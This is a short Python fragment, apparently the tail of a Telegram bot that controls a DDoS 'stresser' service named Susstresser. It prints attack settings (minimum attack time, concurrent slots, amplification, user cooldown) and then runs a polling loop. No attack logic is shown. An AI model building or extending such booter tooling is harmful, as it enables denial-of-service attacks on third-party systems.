print(f"🎯 API: Susstresser (Min {MIN_ATTACK_TIME}s)")
print(f"⚙️ Max Concurrent Slots: {current_max_slots}")
print(f"💪 Attack Amplification: {get_concurrent_limit()}x")
print(f"⏳ Individual Cooldown: {get_user_cooldown_setting()}s")
print("=" * 60)

while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print("Polling crashed, restarting...", e)
        time.sleep(3)